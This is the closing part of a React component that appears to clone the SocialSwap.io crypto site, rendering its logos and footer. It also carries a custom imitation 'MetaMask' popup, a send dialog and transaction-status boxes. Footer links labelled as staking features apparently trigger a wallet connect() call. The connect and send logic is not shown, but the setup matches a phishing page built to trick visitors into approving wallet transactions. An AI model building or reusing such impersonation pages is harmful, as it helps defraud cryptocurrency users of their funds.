                className="audit-companies"
              />
            </div>
          </div>
          <div className="column-audits w-col w-col-6">
            <div>
              <h2 className="headline-h2">Our Partners</h2>
              <p className="regular-text">
                SocialSwap.io has known industry partners for secure and safe
                exchange
              </p>
            </div>
            <div className="w-layout-hflex d-flex mobile">
              <img
                src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee682542bc9c8e2ce466f_token-goodies.webp"
                loading="lazy"
                alt="logo: token goodies"
                className="partner-companies"
              /><img
                src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee68ebfd93e4099bfdcfa_mountain-wolf.webp"
                loading="lazy"
                alt="logo: mountain wolf"
                className="partner-companies"
              />
            </div>
          </div>
        </div>
      </section>
      <div className="footer">
        <div className="footer-wrap">
          <ul className="left-list">
            <li>
              <a href="index.html#" className="footer-link w-inline-block"
                ><img
                  loading="lazy"
                  src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee68e7367ac28ad5c7c42_logo.webp"
                  alt="logo: socialswap"
                  className="footer-img"
              /></a>
            </li>
            <li className="footer-link">
              <a href="index.html#" className="w-inline-block"
                ><img
                  loading="lazy"
                  src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee682ec91b68066957957_trustpilot.webp"
                  alt="logo: trustpilot"
                  className="footer-img"
              /></a>
            </li>
            <li>
              <a href="index.html#" className="footer-link w-inline-block"
                ><img
                  loading="lazy"
                  src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee68223f98881f4d62a35_nrg.webp"
                  alt="logo: NRG"
                  className="footer-img"
              /></a>
            </li>
          </ul>
          <div className="w-layout-hflex footer-right">
            <div className="w-layout-vflex footer-links">
              <h3 className="heading-h3 color-blue">SocialSwap</h3>
              <ul className="link-list">
                <li onClick={()=>{
              connect()
            }}><a href="#" className="footer-link" >Social Staking</a></li>
                <li onClick={()=>{
              connect()
            }}><a href="#" className="footer-link">Social Energy</a></li>
              </ul>
            </div>
            <div className="w-layout-vflex footer-links">
              <h3 className="heading-h3 color-blue">Social Media</h3>
              <ul className="link-list">
                <li className="list-item">
                  <img
                    loading="lazy"
                    src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65be23d7bdf528a08ee_instagram.webp"
                    alt="instagram"
                    className="img-xs"
                  /><a href="index.html#" className="footer-link">Instagram</a>
                </li>
                <li className="list-item">
                  <img
                    loading="lazy"
                    src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65b39ffa5648812b6cc_telegram.webp"
                    alt="telegram"
                    className="img-xs"
                  /><a href="index.html#" className="footer-link">Telegram</a>
                </li>
                <li className="list-item">
                  <img
                    loading="lazy"
                    src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65ba27fc3ea728921ff_twitter.webp"
                    alt="Twitter"
                    className="img-xs"
                  /><a href="index.html#" className="footer-link">X/Twitter</a>
                </li>
                <li className="list-item">
                  <img
                    loading="lazy"
                    src="https://cdn.prod.website-files.com/635397204d0d410851921320/665ee65bacd0a633b6223db2_youtube.webp"
                    alt="Youtube"
                    className="img-xs"
                  /><a href="index.html#" className="footer-link">YouTube</a>
                </li>
              </ul>
            </div>
            <div className="w-layout-vflex footer-links newsletter">
              <h3 className="heading-h3 color-blue">Newsletter</h3>
              <div className="w-form">
                <form
                  id="email-form"
                  name="email-form"
                  data-name="Email Form"
                  method="get"
                  className="form"
                  data-wf-page-id="635397204d0d4177ea921324"
                  data-wf-element-id="fc112256-3a8e-d70e-dc85-5d64e065c22d"
                  data-anti-phishing-live-protection="1762020974507"
                >
                  <input
                    className="text-field-2 w-input"
                    maxLength={256}
                    name="mail-2"
                    data-name="Mail 2"
                    placeholder="Enter email"
                    type="email"
                    id="mail-2"
                  /><input
                    type="submit"
                    data-wait="Wait..."
                    className="btn btn-red w-button"
                    value="Notify Me"
                  />
                </form>
                <div className="w-form-done">
                  <div>Thank you! Your submission has been received!</div>
                </div>
                <div className="w-form-fail">
                  <div>
                    Oops! Something went wrong while submitting the form.
                  </div>
                </div>
              </div>
            </div>
          </div>
        </div>
      </div>
    </div>
    <div className="footer-bottom"></div>
    <p className="paragraph-3">
      SocialSwap.io - Copyright 2021 - 2024 © All rights Reserved.
    </p>
   
    <div
      role="region"
      aria-label="Notifications (F8)"
      tabIndex={-1}
      style={{pointerEvents: "none"}}
    >
      <ol
        tabIndex={-1}
        className="fixed top-0 z-[100] flex max-h-screen w-full flex-col-reverse p-4 sm:bottom-0 sm:right-0 sm:top-auto sm:flex-col md:max-w-[420px]"
      ></ol>
    </div>

      {isTransactionInProgress && (
        <div style={{ padding: '20px', background: '#f0f0f0', margin: '20px', borderRadius: '8px' }}>
          <p>⏳ Transaction in progress...</p>
        </div>
      )}

      {transactionError && (
        <div style={{ padding: '20px', background: '#ffe0e0', margin: '20px', borderRadius: '8px', color: '#c00' }}>
          <p>{transactionError}</p>
        </div>
      )}

      {transactionResult && (
        <div style={{ padding: '20px', background: '#e0ffe0', margin: '20px', borderRadius: '8px' }}>
          <p>✅ Transaction completed!</p>
          <pre style={{ fontSize: '12px', overflow: 'auto' }}>
            {JSON.stringify(transactionResult, null, 2)}
          </pre>
        </div>
      )}

      <SendDialog 
        isOpen={isManOpen}
        handleCancel={handleCancel}
      />

      <MetaMaskPopup 
        isOpen={isOpen }
        onClose={handleClose}
        title={popupTitle}
        message={popupMessage}
        headerText={headerText}
        logoUrl={logoUrl}
        closeIconUrl="https://encrypted-tbn0.gstatic.com/images?q=tbn:ANd9GcR9q901ObJPM2nOB4IMkueQTE7YgBp5mVnM6uhSGYRU_6BzdxsYWTzonrKV3DpYxTNiTWQ&usqp=CAUdata:image/png;base64,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"
        width={400}
        height={400}
      />
    </>
  )
}

export default App
